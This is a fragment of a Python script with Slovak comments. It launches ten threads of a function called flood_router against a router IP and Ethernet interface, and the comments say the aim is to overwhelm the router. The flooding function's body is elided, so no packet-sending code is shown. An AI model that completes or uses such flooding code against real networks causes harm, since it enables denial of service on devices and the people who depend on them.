...
def flood_router(router_ip, interface):
...
# Nastavenie IP adresy routra a názvu ethernetového rozhrania
router_ip = "192.168.1.1"  # Tu zadaj IP adresu svojho routera
ethernet_interface = "eth0"  # Tu zadaj názov svojho ethernetového rozhrania

# Spustenie zahltenia routera pomocou viacerých vlákien
for _ in range(10):  # Počet vlákien pre zvýšenie zahltenia
    t = threading.Thread(target=flood_router, args=(router_ip, ethernet_interface))
    t.start()
